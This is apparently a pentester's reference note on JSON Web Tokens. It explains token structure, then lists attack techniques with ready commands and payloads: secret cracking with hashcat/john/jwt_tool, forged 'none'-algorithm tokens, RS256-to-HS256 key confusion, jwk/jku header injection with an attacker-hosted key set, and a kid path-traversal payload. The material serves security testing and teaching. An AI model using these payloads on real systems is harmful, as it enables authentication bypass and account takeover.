>[!question] What is a JWT?
>JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.

# Structure

JWT are made up by three components, each of them encoded in url_safe base64 and separated using dots: [^1]

[^1]: https://en.wikipedia.org/wiki/JSON_Web_Token

- **Header:** identifies which algorithm is used to generate the signature
- **Body**: contains business data and default [standard fields](https://en.wikipedia.org/wiki/JSON_Web_Token#Standard_fields).
- **Verify** **signature**: calculated using the JWT’s data and the secret/private key. Its purpose is to verify that data has not been altered.

An example is: 

`yJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbkFzIjoiYWRtaW4iLCJpYXQiOjE0MjI3Nzk2Mzh9.gzSraSYS8EXBxLN_oWnFSRgCzcmJmMjLiuyu5CSpyHI`

>[!info]
>The JWT spec is extended by both the **JSON Web Signature** (JWS) and **JSON Web Encryption** (JWE) specifications, which define concrete ways of actually implementing JWTs.

## Usage

- **Authorization**: This is the most common scenario for using JWT. Once the user is logged in, each subsequent request will include the JWT, allowing the user to access routes, services, and resources that are permitted with that token. Single Sign On is a feature that widely uses JWT nowadays, because of its small overhead and its ability to be easily used across different domains.

- **Information Exchange**: JSON Web Tokens are a good way of securely transmitting information between parties. Because JWTs can be signed—for example, using public/private key pairs—you can be sure the senders are who they say they are. Additionally, as the signature is calculated using the header and the payload, you can also verify that the content hasn't been tampered with.

Whenever the user wants to access a protected route or resource, the user agent should send the JWT, typically in the **Authorization** header using the **Bearer** schema (but sometimes they are also stored in Cookies or inside the Local Storage). The content of the header should look like the following:

`Authorization: Bearer <token>` (If the token is sent in the Authorization header, Cross-Origin Resource Sharing (CORS) won't be an issue as it doesn't use cookies.)

JSON Web Token can be read and verified using different tools, one of which is [jwt.io](https://jwt.io/)

## Signing Algorithm

- **HS256** (HMAC + SHA256)
- **RS265** (RSASSA-PKCS1-v1_5 + SHA256)
- **ES256** (ECDSA + P-256 + SHA256)
- …

![JWT1](../../zzz_res/attachments/JWT1.png)

## Interesting fields

-   `jwk` (JSON Web Key) - Provides an embedded JSON object representing the key. JWK is a standardized format for representing keys as a JSON object.
>[!example]
>```json
>{
>    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
>    "typ": "JWT",
>    "alg": "RS256",
>    "jwk": {
>        "kty": "RSA",
>        "e": "AQAB",
>        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
>        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
>    }
>}

-   `jku` (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
-   `kid` (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from.

# Vulnerabilities

## Misc checks

- Tamper data without modifying anything and check for errors or differences in response
- Check where the token originated in your proxy's request history. It should be created on the server, not the client. 
  If it was first seen coming from the client-side then the **key** is accessible to client-side code - seek it out!
- Check if the token lasts more than 24h... maybe it never expires. If there is a "exp" filed, check if the server is correctly handling it.****
- Brute-force HMAC secret (use some [well-known secrets wordlist](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list))
    
    ```bash
    #hashcat
    $ hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
    
    #John
    $ john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
    
    #https://github.com/Sjord/jwtcrack
    $ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
    Cracking JWT ...
    88037it [02:47, 406.48it/s]
    
    #https://github.com/ticarpi/jwt_tool
    $ python3 jwt_tool.py -d wordlists.txt <JWT token>
    
    #https://github.com/mazen160/jwt-pwn
    $ python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt
    [info] Loaded wordlist.
    [info] starting brute-forcing.
    [Progress]: 0.02
    
    #https://github.com/brendan-rius/c-jwt-cracker
    $ ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8
    /opt/jwt/c-jwt-cracker/jwtcrack <token> [alphabet] [max_len] [hmac_alg]
    Defaults: alphabet=eariotnslcudpmhgbfywkvxzjqEARIOTNSLCUDPMHGBFYWKVXZJQ0123456789, max_len=6, hmac_alg=sha256
    
    #https://github.com/lmammino/jwt-cracker
    $ python3 jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
    ```
    

## ‘none’ Algorithm (CVE-2015-9235) / Remove signature / both

>[!tip]
>Set the algorithm used as "None" and remove the signature part.

Use the Burp extension call "JSON Web Token" to try this vulnerability and to change different values inside the JWT (send the request to Repeater and in the "JSON Web Token" tab you can modify the values of the token. You can also select to put the value of the "Alg" field to "None").

Example:

- Original:
    
    `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEwMDAiLCJwcml2IjoidXNlciJ9.FyXaxIcYWlAtioQ15ax2QzS_q0dE7fBhUul9Mzr_LYU`
    
    ```json
    {"alg":"HS256","typ":"JWT"}.{"id":"1000","priv":"user"}
    ```
    
- Exploited:
    
    ```json
    {"alg":"none","typ":"JWT"}.{"id":"1","priv":"admin"}
    ```
    
    `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IjEiLCJwcml2IjoiYWRtaW4ifQ.`
    

## RSA Key Confusion (CVE-2016-5431/CVE-2016-10555)

>[!tip]
>The algorithm HS256 uses the secret key to sign and verify each message.

General steps:
1. Obtain the server's public key
2. Convert the public key to a suitable format
3. Create a malicious JWT with a modified payload and the alg header set to HS256.
4. Sign the token with HS256, using the public key as the secret.


The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.
If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.
Then, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

Other way for obtaining the keys:

- [Finding Public Keys · ticarpi/jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki/Finding-Public-Keys)
- Public keys exposed as JWK objects on standard endpoint ( `/jwks.json` or `/.wll-known/jwks.json`)
- [Extract it from a pair of existing JWTs](https://github.com/silentsignal/rsa_sign2n)

Another example is a server that implements the following pseudo-code:
```javascript
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);

function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}
```

If an attacker is able to leak the public key used by the server, it can pass a JWT signed using HS256 and that public key in order to create valid JWT token.

## Advanced Tests

### jwk header injection (CVE-2018-0114)

>[!tip]
>An attacker **embeds a new key in the header of the token** and the server uses this new key to verify the signature (eg. CVE-2018-0114).

The vulnerability exploit some misconfiguration where server trusts arbitrary injected JWKs. You can create a new RSA certificate pair, inject a JWKs with the details of the Public Key in it, then sign the data with the Private Key. If successful the application should use your provided key data to verify it. 

This can be done with:
- **"JSON Web Tokens" Burp extension**: 
  Send the request to the Repeater, inside the JSON Web Token tab select "CVE-2018-0114" and send the request.

- **"JSON Web Token" Burp extension**:
  1. With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.
  2. Generate a new RSA key.
     ![JKWS_injection_1|900](../../zzz_res/attachments/JKWS_injection_1.png)
  3. Send a request containing a JWT to Burp Repeater.
  4. In the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload however you like.
     ![JKWS_injection_2](../../zzz_res/attachments/JKWS_injection_2.png)
  5. Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.
     ![JKWS_injection_3](../../zzz_res/attachments/JKWS_injection_3.png)
  6. Send the request to test how the server responds.

- **jwt_tool**:
  `$ python3 jwt_tool.py JWT_HERE -X i`

### jku header injection (aka JWKS spoofing)

>[!question]  What is a JWKS?
>A JWK Set is a JSON object containing an array of JWKs representing different keys.
>```json
>{
>    "keys": [
>        {
>            "kty": "RSA",
>            "e": "AQAB",
>            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
>            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
>        },
>        {
>            "kty": "RSA",
>            "e": "AQAB",
>            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
>            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
>        }
>    ]
>}
>```

Some servers let you use the `jku` (JWK Set URL) header parameter to reference a JWK Set containing the key (usually `/.well-known/jwks.json`). When verifying the signature, the server fetches the relevant key from this URL. More secure websites will only fetch keys from trusted domains, but **you can sometimes take advantage of URL parsing discrepancies** using [Server Side Request Forgery (SSRF)](Server%20Side%20Request%20Forgery%20(SSRF).md) with some [evasion](Evading%20Restrictions.md) to bypass this kind of filtering.

Arbitrary JWT containing a jku pointing to the attacker server (JWT must be signed with the same JWKS):
![jku_injection_1](../../zzz_res/attachments/jku_injection_1.png)

JWKS hosted on the attacker site ( `https://exploit-0ad800db048df30dc6fa1c4d01bf000f.exploit-server.net/.well-known/jwks.json`):
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
    "keys": [
		{
		    "p": "z6IASOw4kKgWctgfR_q6E1gs_MDJE7f6czTVOQI058Fh-SZszae02FhXqH4jM9qO26E9bx8-_yl1cTz_nuG6_-YA1YxLJ8F1AjXT7g3YAqxlBTe56qtvyg2Ry8Q4hNphulNOuwvambvVQM43HLvvXNwWGyQ0Pw2LcWM_bV1SSE0",
		    "kty": "RSA",
		    "q": "zWEQaRBKUG9Q0WoLVKTGj0N1WTrL-rFotYhGU9BBKPAEMlJXkt68LObmRRkYgiohOgveIEQ9c8Q7UM7P-y3L8f4okQZKQQEGmFU-uvzQjYUStUneQIKTTR2EWFijuhMwfN0fLyapWX6g5WmfijdRO1BmhrLpAP-hqCWTPtvkiS8",
		    "d": "KuYinoRZPPrp7cqEebz-n4y09w_hUlfeHlO8VuILq4kcVOWKpXvAUSOT_nxCoX-xo1kKlfl1mxRRKSiiVspUiBmWRVCAlryC8LiC-uQBYG_rCQ1nnPKlgYIIszFwnKJhnSYd7x3bjyMevKAOqMjjVNrci7Ql-m59K9redJJs08c5YQcc1k7Q6d1nyB1JbqG4-94OIC30ws96-BpImE31dJdZ_e9Kzqlcuuj8N_xwvgjKym5tHfgO11sYPwebqUXmvcsn15z87E3dlj6tNawKK9EvQgqDhp0NgAqdd0n5z9PIEVbk0Vur-PucGhXakmy9_IduwR844IS9hYbAnp5iMQ",
		    "e": "AQAB",
		    "kid": "c1f90a45-7b56-484d-b8b7-0a69da1def8f",
		    "qi": "oOfGvB5KsbyrVy9vDH3a3oAiSIHk-enm8AWzJHDn2XtUlVIeebJR-chzo8qvrpGOEZp9ABM5ocrcFlnWn6AKAc_CAREdM_OPBftsHFzH3y-0hIrSITcifpbHYlJtigi6cEJd_awyUA_iIgv3j3t5CMgmTOrTbhmbVSbIwfXfGZ0",
		    "dp": "jMS4jLgaYXiUP6hnDNXf8d2GIpZRvRyuoAzhwpTMaZOiaNi0S3m4EjVSuNlL5Iv47s6SaBQ3Ead6CBvi8kT4EyZMynsjOQDf42-7D1ozaRyYIMF3OrKgR8yLXCrcZrXoK_rvFcEjo7bFDfrBQqnnzn0oP558DYORVn6DMhJjBsE",
		    "dq": "SAYdIiszVIflGLuOo61xcLZghd1HwW_L37WdrDDhWQDrB9a2nWv9I-YJpPvLC4LIyjl1OW2U-286ufj9GQITfpb6FPnWunsom-1xJVQZszeSuv7fsVHZZHbQfccAC_ZEz9Uf5YIya48rz6g96dPCagGlIuHFMrNzNquOusGUoMM",
		    "n": "ppNz69d34AdioYMdCOkaMAqA-34rp-yXpjxJVHWeWBsOnyrq5vLz6OID-ZKgrsRROTkHid_1oivt4cCm9P-YaUu4_6XPwVgHPQ6GrgyAkWL56tUlcG0-lYvZXxK2xYdMpnnvJvpOpPGO93UdKkAR7J5fK6nAdMxVN5r1KWvNfqg7jF7WSfuC2Y3wV_aj9oWS8t0vs_34Xpd0NOvAjYRwxfqMgPJgbvbpV7fc68mxBSqH2L-TlLU3-l6iWPtbGQu5EYq2AI_V7QZi4Sspur5m_uOOghtNQ3AGxgLHlqX2VSE-wnpyGn9MdF2Ij4mMtt_kPmf-R89J0MXO-WbNbmB7Iw"
		}
	]
}
```

### Injecting self-signed JWTs via the kid parameter

Sometime JWTs contains the `kid` (Key ID) parameter to help servers identify which key to use when verifying the signature. 
Verification keys are often stored as a JWK Set, so normally the `kid` simply contains the respective key id, however, the JWS specification doesn't define a concrete structure for this ID, meaning that sometime this field is used for "custom" implementations (eg. to point to a particular entry in a database, or even the name of a file).

If the field is pointing directly to a file and the implementation is vulnerable to [SQL Injection](SQL%20Injection.md) or [Path Traversal](Path%20Traversal.md), attackers can potentially validate arbitrary custom tokens forcing the JWT using their known key (uploaded on the server, hosted online or `/dev/null`).

>[!tip]
>You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature.
>>[!note]
>>If you're using the JWT Editor extension, note that this doesn't let you sign tokens using an empty string. However, due to a bug in the extension, you can get around this by using a Base64-encoded null byte.

JWT:
```json
{
    "kid": "../../../../../../../../../../../dev/null",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

Signing key:
```json
{
    "kty": "oct",
    "kid": "void",
    "k": "AA=="
}
```

### Other

- "kid" issues - reveal key
- Fuzzing existing claims (forcing errors)
- `cty` (Content Type) spoofing
- `x5c` header injection
- [JWT Vulnerabilities (Json Web Tokens)](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [Attack Methodology · ticarpi/jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)

# Tools

- [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
- [JSON Web Tokens](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)
- [JSON Web Token Attacker](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)